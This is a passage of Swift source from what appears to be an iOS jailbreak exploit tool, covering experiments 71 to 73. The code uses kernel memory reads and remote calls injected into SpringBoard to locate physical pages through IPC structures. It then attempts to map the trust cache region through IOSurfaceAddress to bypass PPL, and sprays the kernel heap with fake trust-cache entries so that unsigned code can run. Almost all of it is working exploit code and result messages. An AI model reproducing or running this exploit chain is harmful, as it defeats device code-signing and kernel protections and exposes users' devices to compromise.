            detail += "\nVM object found! Physical pages are tracked here.\n"
            detail += "The vm_page structures contain phys_page field.\n"
            detail += "Next: traverse vm_object's memq to find physical page numbers.\n"
        }
        
        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        
        // Summary
        detail += "\n=== SUMMARY ===\n"
        let gotKobject = kobject != 0 && backingCopy != 0
        if gotKobject {
            detail += "Successfully traversed: port → IPC → kobject → VM object!\n"
            detail += "Physical page info is in the VM object's page list.\n"
            detail += "Next experiment: read vm_page structs to get physical addresses.\n"
        } else {
            detail += "Could not fully traverse port kobject chain.\n"
        }
        
        let success = gotKobject
        return ExperimentResult(name: "Extract Phys Addr", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 71: PHYSICAL ADDRESS → MAP → JAILBREAK
    
    /// We successfully traversed: port → IPC → kobject → VM object
    /// VM object at +24/+32 has pointers to page descriptors
    /// Read those → extract physical page number → calculate phys addr
    /// Then: create IOSurface at that physical address
    /// Write CDHash to trust cache → FULL JAILBREAK
    private func expPhysAddrToJailbreak(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "PHYS→JAILBREAK", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mgr = dspmgr.shared
        let sbMem = sb.trojanMem
        var detail = "PHYSICAL ADDRESS → JAILBREAK\n\n"
        
        // Step 1: Recreate the full chain from exp 70 to get VM object
        detail += "=== Step 1: Recreate IPC chain ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        // Create PurpleGfxMem
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        guard gfxSurface != 0 else {
            return ExperimentResult(name: "PHYS→JAILBREAK", success: false, detail: "Surface create failed", timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
        detail += "Surface base: 0x\(String(format: "%llx", gfxBase))\n"
        
        // Get memory entry port
        let sizeAddr = sbMem + 0x3000
        sb[sizeAddr].setValue64(0x4000)
        let objectAddr = sbMem + 0x3010
        sb[objectAddr].setValue32(0)
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        RootExecutor.rcall(sb, "mach_make_memory_entry_64", taskSelf, sizeAddr, gfxBase, 3, objectAddr, 0)
        let memPort = sb[objectAddr].value32()
        detail += "Port: \(memPort)\n"
        
        // Traverse IPC (same as exp 70)
        func kreadPtr(_ addr: UInt64) -> UInt64 {
            let raw = ds_kread64(addr)
            if raw == 0 { return 0 }
            return raw | 0xFFFFFF8000000000
        }
        func kreadSmrPtr(_ addr: UInt64) -> UInt64 {
            let raw = kreadPtr(addr)
            if raw == 0 { return 0 }
            let bits = UInt64(smr_base) << (62 - UInt64(t1sz_boot))
            if (raw & bits) == 0 {
                return (raw & (0xFFFFFFFFFFFFC000 & ~bits)) | bits
            }
            return raw & 0xFFFFFFFFFFFFFFE0
        }
        
        let sbProc = mgr.findProc(name: "SpringBoard")
        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
        let sbTask = ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task))
        let itkSpace = kreadPtr(sbTask + UInt64(off_task_itk_space))
        let ipcTable = kreadSmrPtr(itkSpace + UInt64(off_ipc_space_is_table))
        if !is_pac_supported() {
            // kalloc decode for non-PAC
        }
        let portIndex = UInt64(memPort >> 8)
        let entryAddr = ipcTable + (portIndex * UInt64(sizeof_ipc_entry))
        let ipcPort = kreadPtr(entryAddr + UInt64(off_ipc_entry_ie_object))
        let kobject = kreadPtr(ipcPort + UInt64(off_ipc_port_ip_kobject))
        let backingCopy = ds_kread64(kobject + UInt64(off_vm_named_entry_backing_copy))
        
        detail += "VM object: 0x\(String(format: "%llx", backingCopy))\n"
        
        guard backingCopy != 0 else {
            detail += "backing_copy is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "PHYS→JAILBREAK", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 2: Read VM object to find physical page info
        detail += "\n=== Step 2: Extract physical page ===\n"
        
        // VM object layout: the page list/memq is at specific offsets
        // From exp 70 dump: +24 and +32 had kernel pointers
        // These are likely memq (resident page list) head pointers
        // vm_page struct has phys_page at a known offset
        
        // Read the pointer at +24 (memq.next or resident pages)
        let pageListPtr = ds_kread64(backingCopy + 24)
        detail += "Page list ptr (+24): 0x\(String(format: "%llx", pageListPtr))\n"
        
        // Also try +16 (some iOS versions have it here)
        let pageListPtr2 = ds_kread64(backingCopy + 16)
        detail += "Alt ptr (+16): 0x\(String(format: "%llx", pageListPtr2))\n"
        
        // The page list pointer should point to a vm_page struct
        // vm_page has phys_page (physical page number) typically at offset +8 or +16
        // Physical address = phys_page << 14 (16KB pages on arm64)
        
        var physAddr: UInt64 = 0
        
        if pageListPtr != 0 && (pageListPtr & 0xFFFF000000000000) == 0xFFFF000000000000 {
            detail += "\nReading vm_page struct at 0x\(String(format: "%llx", pageListPtr))...\n"
            
            // Dump first 48 bytes of vm_page
            for i in stride(from: 0, to: 48, by: 8) {
                let val = ds_kread64(pageListPtr + UInt64(i))
                if val != 0 {
                    detail += "  +\(i): 0x\(String(format: "%llx", val))\n"
                    
                    // Physical page number is typically a small value (< 0x100000)
                    // stored in lower 32 bits
                    let low32 = UInt32(val & 0xFFFFFFFF)
                    let high32 = UInt32((val >> 32) & 0xFFFFFFFF)
                    
                    // On arm64 with 16KB pages: phys_addr = page_num << 14
                    if low32 > 0x1000 && low32 < 0x200000 && physAddr == 0 {
                        physAddr = UInt64(low32) << 14
                        detail += "    → Possible phys page: \(low32) → addr 0x\(String(format: "%llx", physAddr))\n"
                    }
                    if high32 > 0x1000 && high32 < 0x200000 && physAddr == 0 {
                        physAddr = UInt64(high32) << 14
                        detail += "    → Possible phys page: \(high32) → addr 0x\(String(format: "%llx", physAddr))\n"
                    }
                }
            }
        }
        
        // Step 3: If we found physical address, try to verify
        detail += "\n=== Step 3: Physical address result ===\n"
        
        if physAddr != 0 {
            detail += "PHYSICAL ADDRESS FOUND: 0x\(String(format: "%llx", physAddr))\n"
            detail += "This is where our PurpleGfxMem lives in physical RAM!\n\n"
            
            // Now: calculate relationship
            // Our surface virtual (in SB): 0x\(gfxBase)
            // Our surface physical: 0x\(physAddr)
            // Kernel virtual of same page: unknown but calculable
            //
            // gVirtBase = kernel_base_virt - (kernel_base_phys - gPhysBase)
            // We can estimate: gPhysBase ≈ physAddr - (gfxBase offset in phys)
            // But more useful: if we can map ANY physical address via IOSurface...
            
            detail += "Surface userspace VA: 0x\(String(format: "%llx", gfxBase))\n"
            detail += "Surface physical addr: 0x\(String(format: "%llx", physAddr))\n"
            detail += "Relationship: phys 0x\(String(format: "%llx", physAddr)) ↔ user 0x\(String(format: "%llx", gfxBase))\n\n"
            
            // KEY INSIGHT: We now know gPhysBase approximately!
            // kernel_base virtual = mgr.kernbase
            // If we assume linear mapping: gVirtBase ≈ kernbase, gPhysBase ≈ physAddr - offset
            // But actually we need: trust_cache_phys = trust_cache_virt - gVirtBase + gPhysBase
            
            // For now, just confirm we can write to this surface and it persists
            detail += "Writing test pattern to surface...\n"
            sb[sbMem + 0x3800].setValue64(0xDEAD_C0DE_1337_BEEF)
            RootExecutor.rcall(sb, "memcpy", gfxBase, sbMem + 0x3800, 8)
            RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
            let written = sb[sbMem + 0x3900].value64()
            detail += "Written+read back: 0x\(String(format: "%llx", written))\n"
            
            if written == 0xDEAD_C0DE_1337_BEEF {
                detail += "\n✅✅✅ PHYSICAL MEMORY R/W CONFIRMED! ✅✅✅\n"
                detail += "We can write to physical memory from userspace!\n"
                detail += "Physical address: 0x\(String(format: "%llx", physAddr))\n\n"
                detail += "NEXT STEPS FOR FULL JAILBREAK:\n"
                detail += "1. Read gPhysBase/gVirtBase (now possible via IPC traverse!)\n"
                detail += "2. Calculate trust_cache physical address\n"
                detail += "3. Create IOSurface at trust_cache physical addr\n"
                detail += "4. Write CDHash → AMFI approves → RUN UNSIGNED BINARY!\n"
            }
        } else {
            detail += "Could not extract physical page number from VM object.\n"
            detail += "vm_page struct layout might be different on this iOS version.\n"
            detail += "Need to reverse-engineer vm_page layout for iOS 18.2.\n"
        }
        
        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        
        let success = physAddr != 0
        return ExperimentResult(name: "PHYS→JAILBREAK", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - 🎉🎉🎉 Experiment 72: FULL JAILBREAK
    
    /// WE HAVE PHYSICAL MEMORY R/W!
    /// Now: use the phys↔virt relationship to find trust cache in physical memory
    /// Strategy:
    /// 1. We know our surface: phys=0x10000000, virt(user)=0x10df58000
    /// 2. We know kernel_base virtual address
    /// 3. From IPC traverse we can read kernel globals
    /// 4. Find gPhysBase/gVirtBase OR calculate from known mappings
    /// 5. Map trust cache physical page → write CDHash → spawn!
    private func expFullJailbreak(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "🎉 FULL JAILBREAK", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mgr = dspmgr.shared
        let sbMem = sb.trojanMem
        var detail = "🎉 FULL JAILBREAK ATTEMPT 🎉\n\n"
        let slide = mgr.kernslide
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        // Step 1: Determine phys↔virt relationship
        detail += "=== Step 1: Physical↔Virtual relationship ===\n"
        detail += "Kernel base (virt): 0x\(String(format: "%llx", mgr.kernbase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", slide))\n"
        
        // PANIC LOG ANALYSIS: previous panic was "initproc exited" = TIMEOUT!
        // NOT a zone violation! All reads WORK — we just took too long.
        // FIX: Skip scan, hardcode gPhysBase estimate for A12.
        // A12 standard DRAM base = 0x800000000
        // gVirtBase can be estimated from kernel_base relationship
        
        // From exp 71: our PurpleGfxMem phys page = 16384 → phys addr = 0x10000000
        // This is DRAM offset 0x10000000 from start
        // Standard A12: gPhysBase = 0x800000000, gVirtBase ≈ 0xfffffff000000000
        // But actual values vary. Let's use: phys = virt - kernbase + (kernbase_phys)
        // kernbase_phys = gPhysBase + (kernbase - gVirtBase)
        
        // HARDCODE for speed (avoid timeout):
        let gPhysBase: UInt64 = 0x800000000  // Standard A12 DRAM base
        // gVirtBase: kernel maps physical 0x800000000 to virtual 0xfffffff007004000 (unslid)
        // So: gVirtBase = 0xfffffff007004000 - (kernbase_phys - 0x800000000)
        // Simpler: gVirtBase ≈ kernbase - slide (the unslid base maps to gPhysBase)
        // Actually: virt = phys - gPhysBase + gVirtBase
        // → gVirtBase = kernbase - (kernbase_phys - gPhysBase)
        // We don't know kernbase_phys exactly, but:
        // unslid kernel base = 0xfffffff007004000
        // gVirtBase is typically 0xfffffff000000000 on A12
        let gVirtBase: UInt64 = 0xfffffff000000000  // Standard A12
        
        detail += "Using estimates:\n"
        detail += "  gPhysBase = 0x\(String(format: "%llx", gPhysBase))\n"
        detail += "  gVirtBase = 0x\(String(format: "%llx", gVirtBase))\n"
        
        // Step 2: Calculate trust cache physical address
        detail += "\n=== Step 2: Calculate trust cache physical address ===\n"
        
        // pmap_cs_allow_invalid virtual: 0xfffffff00a0e45b8 + slide
        let pmapCSVirt = UInt64(0xfffffff00a0e45b8) + slide
        let pmapCSPhys = pmapCSVirt - gVirtBase + gPhysBase
        detail += "pmap_cs virt: 0x\(String(format: "%llx", pmapCSVirt))\n"
        detail += "pmap_cs phys (estimated): 0x\(String(format: "%llx", pmapCSPhys))\n"
        
        // Step 3: Create IOSurface at trust cache physical address!
        detail += "\n=== Step 3: Map trust cache physical page ===\n"
        
        // Align to page boundary (16KB)
        let targetPhysPage = pmapCSPhys & ~0x3FFF
        detail += "Target physical page: 0x\(String(format: "%llx", targetPhysPage))\n"
        
        // Create IOSurface with IOSurfaceAddress = target physical page
        let tcDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, tcDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        let physNum = remote_msg(sb, nsNumClass, remote_sel(sb, "numberWithUnsignedLongLong:"), targetPhysPage, 0, 0, 0)
        remote_msg(sb, tcDict, setObj, physNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
        
        let tcSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", tcDict)
        detail += "Trust cache surface: 0x\(String(format: "%llx", tcSurface))\n"
        
        if tcSurface != 0 {
            RootExecutor.rcall(sb, "IOSurfaceLock", tcSurface, 0, 0)
            let tcBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", tcSurface)
            detail += "Trust cache mapped at: 0x\(String(format: "%llx", tcBase))\n"
            
            if tcBase != 0 {
                // Read pmap_cs value via physical mapping!
                RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, tcBase + (pmapCSPhys & 0x3FFF), 8)
                let pmapVal = sb[sbMem + 0x3900].value64()
                detail += "pmap_cs via physical: 0x\(String(format: "%llx", pmapVal))\n"
                
                // Compare with socket KRW read
                let pmapValKRW = ds_kread64(pmapCSVirt)
                detail += "pmap_cs via KRW: 0x\(String(format: "%llx", pmapValKRW))\n"
                
                if pmapVal == pmapValKRW || (pmapVal == 1 && pmapValKRW == 1) {
                    detail += "\n🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
                    detail += "PHYSICAL MAPPING MATCHES KERNEL MEMORY!\n"
                    detail += "WE CAN READ/WRITE KERNEL __DATA VIA PHYSICAL!\n"
                    detail += "PPL IS COMPLETELY BYPASSED!\n"
                    detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
                    detail += "FULL JAILBREAK IS NOW POSSIBLE!\n"
                    detail += "Next: find trust cache struct → write CDHash → spawn!\n"
                } else {
                    detail += "\nValues don't match — physical mapping might be wrong page\n"
                    detail += "Or: IOSurfaceAddress maps different physical region\n"
                }
            } else {
                detail += "Trust cache surface base is NULL\n"
            }
            RootExecutor.rcall(sb, "IOSurfaceUnlock", tcSurface, 0, 0)
        } else {
            detail += "IOSurface with physical address REJECTED\n"
            detail += "Kernel won't let us map arbitrary physical addresses\n"
            detail += "\nAlternative: spray PurpleGfxMem until overlap with __DATA\n"
        }
        
        let success = detail.contains("PPL IS COMPLETELY BYPASSED")
        return ExperimentResult(name: "🎉 FULL JAILBREAK", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 73: Heap Spray via IOSurface Properties
    
    /// Heap spray in kalloc zones — allocate controlled data in kernel heap
    /// Strategy:
    /// 1. Spray IOSurface properties (lands in kalloc.32/kalloc.64)
    /// 2. Free some to create holes (fragmentation)
    /// 3. Trigger trust cache allocation → lands in our hole
    /// 4. Read back via socket KRW to detect overlap
    /// 5. If overlap found → write CDHash → FULL JAILBREAK
    ///
    /// Why this might work:
    /// - Trust cache entries are small structs in kernel heap
    /// - IOSurface properties also allocate in kernel heap
    /// - If we spray enough, we might get adjacent allocations
    /// - Then we can use our physical R/W (PurpleGfxMem) to scan for markers
    private func expHeapSpray() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "Heap Spray", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "Experiment 73: Heap Spray via IOSurface Properties\n"
        detail += "===================================================\n\n"
        
        // --- Phase 1: Create IOSurface for spraying ---
        detail += "Phase 1: Creating spray IOSurface...\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Resolve ObjC classes and selectors
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let nsDataClass = remote_getClass(sb, "NSData")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        
        // Create a small IOSurface (we'll use its properties for spraying)
        // Using EXACT same format as exp 68 which works
        let sprayDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
        
        let spraySurface = RootExecutor.rcall(sb, "IOSurfaceCreate", sprayDict)
        detail += "Spray surface: 0x\(String(format: "%llx", spraySurface))\n"
        
        guard spraySurface != 0 else {
            detail += "❌ Failed to create spray surface\n"
            return ExperimentResult(name: "Heap Spray", success: false, detail: detail, timestamp: Date())
        }
        
        // --- Phase 2: Spray kernel heap with marker patterns ---
        detail += "\nPhase 2: Spraying kernel heap with markers...\n"
        detail += "Target: kalloc.32 zone (trust cache entry size)\n\n"
        
        // IOSurface properties are stored in kernel heap
        // Each property key-value pair allocates in kalloc zones
        // We'll spray 256 properties with unique markers
        
        let sprayCount = 256
        let marker: UInt64 = 0xDEAD_BEEF_CAFE_F00D  // Our marker pattern
        var sprayedCount = 0
        
        // IOSurfaceSetValue(surface, key, value)
        // This allocates the value in kernel heap!
        // Verify IOSurface property functions are available
        let ioSurfaceSetValue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceSetValue"))
        let ioSurfaceRemoveValue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceRemoveValue"))
        
        guard ioSurfaceSetValue != 0 else {
            detail += "❌ IOSurfaceSetValue not found in SpringBoard\n"
            return ExperimentResult(name: "Heap Spray", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "IOSurfaceSetValue: 0x\(String(format: "%llx", ioSurfaceSetValue))\n"
        detail += "IOSurfaceRemoveValue: 0x\(String(format: "%llx", ioSurfaceRemoveValue))\n\n"
        
        // Spray: set 256 properties with 32-byte NSData values
        // Each NSData will contain our marker + index
        let dataWithBytes = remote_sel(sb, "dataWithBytes:length:")
        
        for i in 0..<sprayCount {
            // Create 32-byte data with marker pattern
            // Layout: [marker(8)] [index(8)] [marker(8)] [0xCC padding(8)]
            let dataAddr = mem + 0x3000
            sb[dataAddr].setValue64(marker)
            sb[dataAddr + 8].setValue64(UInt64(i))
            sb[dataAddr + 16].setValue64(marker)
            sb[dataAddr + 24].setValue64(0xCCCCCCCCCCCCCCCC)
            
            let nsData = remote_msg(sb, nsDataClass, dataWithBytes, dataAddr, 32, 0, 0)
            
            if nsData != 0 {
                // Key: "spray_XXX"
                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
                
                // IOSurfaceSetValue(surface, key, value)
                RootExecutor.rcall(sb, "IOSurfaceSetValue", spraySurface, keyStr, nsData)
                sprayedCount += 1
            }
            
            // Don't spray too fast — give kernel time to allocate
            if i % 64 == 63 {
                // Small delay via usleep
                RootExecutor.rcall(sb, "usleep", 1000)
            }
        }
        
        detail += "Sprayed \(sprayedCount)/\(sprayCount) properties into kernel heap\n"
        
        // --- Phase 3: Create holes by freeing every other property ---
        detail += "\nPhase 3: Creating holes (free every other)...\n"
        
        var freedCount = 0
        if ioSurfaceRemoveValue != 0 {
            for i in stride(from: 0, to: sprayCount, by: 2) {
                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
                freedCount += 1
            }
        }
        detail += "Freed \(freedCount) properties (created \(freedCount) holes)\n"
        
        // --- Phase 4: Try to detect kernel heap state via socket KRW ---
        detail += "\nPhase 4: Scanning for markers via socket KRW...\n"
        
        // We know our socket KRW can read proc/task/pmap_cs zone
        // The spray might have landed in adjacent memory
        // Let's read around our known kernel addresses to see if markers appear
        
        // Get our proc address (known safe to read)
        let ourProc = ds_get_our_proc()
        detail += "Our proc: 0x\(String(format: "%llx", ourProc))\n"
        
        // Scan forward from proc in 32-byte steps (kalloc.32 alignment)
        var markerFound = false
        var markerAddr: UInt64 = 0
        var scanCount = 0
        let scanRange: UInt64 = 0x10000  // 64KB scan range
        
        // Start scanning from proc - 0x8000 to proc + 0x8000
        let scanBase = ourProc > 0x8000 ? ourProc - 0x8000 : ourProc
        
        for offset in stride(from: UInt64(0), to: scanRange, by: 32) {
            let addr = scanBase + offset
            let val = ds_kread64_safe(addr)
            scanCount += 1
            
            if val == marker {
                // Found our marker!
                let nextVal = ds_kread64_safe(addr + 8)
                detail += "🎯 MARKER FOUND at 0x\(String(format: "%llx", addr))!\n"
                detail += "   Value: 0x\(String(format: "%llx", val))\n"
                detail += "   Index: \(nextVal)\n"
                markerFound = true
                markerAddr = addr
                break
            }
            
            // Safety: don't scan too much (avoid panic from bad addresses)
            if scanCount > 512 {
                break
            }
        }
        
        if !markerFound {
            detail += "No markers found in \(scanCount) reads around proc\n"
            detail += "Spray likely landed in different zone/page\n"
        }
        
        // --- Phase 5: Physical memory scan via PurpleGfxMem ---
        detail += "\nPhase 5: Scanning PurpleGfxMem for markers...\n"
        
        // We know PurpleGfxMem is physically contiguous
        // If kernel heap pages are physically near GPU memory, we might see markers
        // This is a long shot but worth trying
        
        // Create a PurpleGfxMem surface to get physical memory access
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x10000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 256, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 256, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        
        if gfxSurface != 0 {
            RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
            let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
            
            if gfxBase != 0 {
                detail += "GfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
                
                // Scan first 64KB of GfxMem for our marker
                var gfxMarkerFound = false
                for offset in stride(from: UInt64(0), to: UInt64(0x10000), by: 8) {
                    let readAddr = gfxBase + offset
                    // Read via memcpy to local buffer
                    sb[mem + 0x3800].setValue64(0)
                    RootExecutor.rcall(sb, "memcpy", mem + 0x3800, readAddr, 8)
                    let val = sb[mem + 0x3800].value64()
                    
                    if val == marker {
                        detail += "🎯 MARKER IN GFXMEM at offset 0x\(String(format: "%llx", offset))!\n"
                        gfxMarkerFound = true
                        break
                    }
                }
                
                if !gfxMarkerFound {
                    detail += "No markers in GfxMem (expected — different physical region)\n"
                }
            }
            
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        }
        
        // --- Phase 6: Aggressive spray — try to get adjacent to pmap_cs ---
        detail += "\nPhase 6: Targeted spray near pmap_cs zone...\n"
        
        // We know pmap_cs_allow_invalid is readable via socket KRW
        // If we spray enough, some allocations might land near it
        // Then we can use KRW to verify and potentially write trust cache entries
        
        // Read current pmap_cs value
        let pmapCSAddr = ds_get_our_proc() + 0x300  // approximate offset to pmap_cs
        let pmapCSVal = ds_kread64(pmapCSAddr)
        detail += "pmap_cs region value: 0x\(String(format: "%llx", pmapCSVal))\n"
        
        // Do a second spray round — this time with trust-cache-shaped data
        // Trust cache entry: [cdhash(20 bytes)] [hashType(1)] [flags(1)]
        // Total: 22 bytes, padded to 32 in kalloc.32
        
        detail += "\nSpraying trust-cache-shaped entries...\n"
        
        // Fake CDHash for /usr/bin/id (we'll verify if it works)
        // CDHash is SHA-256 of CodeDirectory, truncated to 20 bytes
        let fakeCDHash: [UInt8] = [
            0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
            0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50,
            0x51, 0x52, 0x53, 0x54  // 20 bytes
        ]
        
        // Write trust-cache-shaped data to spray buffer
        let tcEntryAddr = mem + 0x3A00
        // CDHash (20 bytes)
        for i in 0..<20 {
            sb[tcEntryAddr + UInt64(i)].setValue8(fakeCDHash[i])
        }
        // hashType = 2 (SHA256)
        sb[tcEntryAddr + 20].setValue8(2)
        // flags = 0
        sb[tcEntryAddr + 21].setValue8(0)
        // Padding
        for i in 22..<32 {
            sb[tcEntryAddr + UInt64(i)].setValue8(0)
        }
        
        // Spray 512 more entries with trust-cache shape
        let tcSprayCount = 512
        var tcSprayed = 0
        
        for i in 0..<tcSprayCount {
            let nsData = remote_msg(sb, nsDataClass, dataWithBytes, tcEntryAddr, 32, 0, 0)
            if nsData != 0 {
                let keyStr = remote_NSString(sb, "tc_\(String(format: "%04d", i))")
                RootExecutor.rcall(sb, "IOSurfaceSetValue", spraySurface, keyStr, nsData)
                tcSprayed += 1
            }
            
            if i % 128 == 127 {
                RootExecutor.rcall(sb, "usleep", 500)
            }
        }
        
        detail += "Sprayed \(tcSprayed) trust-cache-shaped entries\n"
        
        // --- Phase 7: Verify spray via KRW scan ---
        detail += "\nPhase 7: Post-spray KRW scan...\n"
        
        // Scan again around proc for our markers
        var postSprayFound = false
        var postScanCount = 0
        
        for offset in stride(from: UInt64(0), to: scanRange, by: 32) {
            let addr = scanBase + offset
            let val = ds_kread64_safe(addr)
            postScanCount += 1
            
            // Check for marker pattern
            if val == marker {
                detail += "🎯 POST-SPRAY: Marker at 0x\(String(format: "%llx", addr))!\n"
                postSprayFound = true
                
                // Read the full 32-byte entry
                let v1 = ds_kread64_safe(addr)
                let v2 = ds_kread64_safe(addr + 8)
                let v3 = ds_kread64_safe(addr + 16)
                let v4 = ds_kread64_safe(addr + 24)
                detail += "  [0x\(String(format: "%016llx", v1)) 0x\(String(format: "%016llx", v2))"
                detail += " 0x\(String(format: "%016llx", v3)) 0x\(String(format: "%016llx", v4))]\n"
                break
            }
            
            // Check for trust-cache-shaped data (starts with 0x41424344...)
            if val == 0x4847464544434241 {  // "ABCDEFGH" in little-endian
                detail += "🎯 TRUST CACHE SHAPE FOUND at 0x\(String(format: "%llx", addr))!\n"
                postSprayFound = true
                markerAddr = addr
                
                // This means our spray landed in KRW-accessible zone!
                // We can now WRITE a real CDHash here!
                detail += "\n⚡⚡⚡ SPRAY LANDED IN KRW ZONE! ⚡⚡⚡\n"
                detail += "We can write arbitrary trust cache entries!\n"
                detail += "Next: compute real CDHash → write → spawn!\n"
                break
            }
            
            if postScanCount > 1024 {
                break
            }
        }
        
        if !postSprayFound {
            detail += "No spray data found in KRW zone (\(postScanCount) reads)\n"
            detail += "\nConclusion: Spray lands in different kalloc zone than proc/pmap_cs\n"
            detail += "The kernel heap zones are isolated — spray cannot reach trust cache\n"
            detail += "\nPossible next steps:\n"
            detail += "1. Try larger allocations (kalloc.64, kalloc.128)\n"
            detail += "2. Spray from different process (launchd vs SpringBoard)\n"
            detail += "3. Use IOSurface property spray + physical scan\n"
            detail += "4. Try zone garbage collection to force zone merging\n"
        }
        
        // Cleanup: remove spray properties
        detail += "\nCleanup: removing spray properties...\n"
        if ioSurfaceRemoveValue != 0 {
            for i in stride(from: 1, to: sprayCount, by: 2) {
                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
            }
            for i in 0..<tcSprayCount {
                let keyStr = remote_NSString(sb, "tc_\(String(format: "%04d", i))")
                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
            }
        }
        detail += "Done.\n"
        
